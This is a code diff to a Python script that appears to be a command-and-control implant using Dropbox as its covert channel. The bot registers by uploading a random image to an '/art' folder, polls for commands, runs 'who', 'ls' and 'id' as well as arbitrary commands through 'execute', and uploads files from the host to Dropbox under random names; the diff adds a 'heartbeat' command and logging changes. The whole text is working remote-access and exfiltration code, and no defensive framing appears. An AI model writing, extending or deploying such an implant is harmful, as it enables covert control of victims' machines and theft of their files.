@@ -31,6 +31,7 @@ def init(access_token):
 
 
 def register(dbx):
+    print("Generating image...")
     img_size = (512,512)
     img = get_random_image(img_size)
 
@@ -47,12 +48,11 @@ def register(dbx):
 
     f=open('/usr/share/dict/words')
     lines=f.readlines()
+    f.close()
 
     names = []
     for entry in dbx.files_list_folder('/art').entries:
         names.append(entry.name[:-4])
-
-    print(names)
   
     idx = random.randint(0, len(lines))
     new_name = lines[idx].strip()
@@ -61,6 +61,7 @@ def register(dbx):
         new_name = lines[idx].strip()
 
     new_name = new_name+'.png'
+    print("ID: " + new_name)
 
     dbx.files_upload(buf.getvalue(), '/art/' + new_name)
 
@@ -76,14 +77,12 @@ def call_command(args):
     return ret
 
 def execute_command(dbx, fields):
-    #print("Executing " + str(fields))
     words = fields[2].split(' ')
-    print(words)
+    print("Processing " + fields[0] + " " + fields[2])
 
     if words[0] == 'who':
         content = call_command(["w"])
     elif words[0] == 'ls':
-        #subprocess.Popen("echo Hello World", shell=True, stdout=subprocess.PIPE).stdout.read()
         content = call_command(["ls", words[1]])
     elif words[0] == 'id':
         content = call_command(["id"])
@@ -96,9 +95,12 @@ def execute_command(dbx, fields):
             rand_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) + ext
             f = open(path, "rb")
             dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/art/' + rand_name)
+            f.close()
             content = rand_name + '\n'
     elif words[0] == 'execute':
         content = call_command([words[1]])
+    elif words[0] == 'heartbeat':
+        content = 'Alive\n'
     else: 
         content = 'Invalid command'
 
@@ -112,7 +114,6 @@ def listen(dbx, my_id):
         if diff.seconds <= CHECK_PERIOD:
             time.sleep(CHECK_PERIOD - diff.seconds)
 
-        print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
         tmp = datetime.now()    
         process_commands(dbx, my_id, last_check)
         last_check = tmp
@@ -126,7 +127,6 @@ def process_commands(dbx, my_id, last_check):
 
     for line in message.split(';')[:-1]:
         fields = line.split('|')
-        #print(fields)
         command_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
         if last_check < command_time and fields[1] == 'REQUEST':
             content = 'Response to ' + fields[0] + ' ' + fields[2] + ' from ' + my_id + '\n'
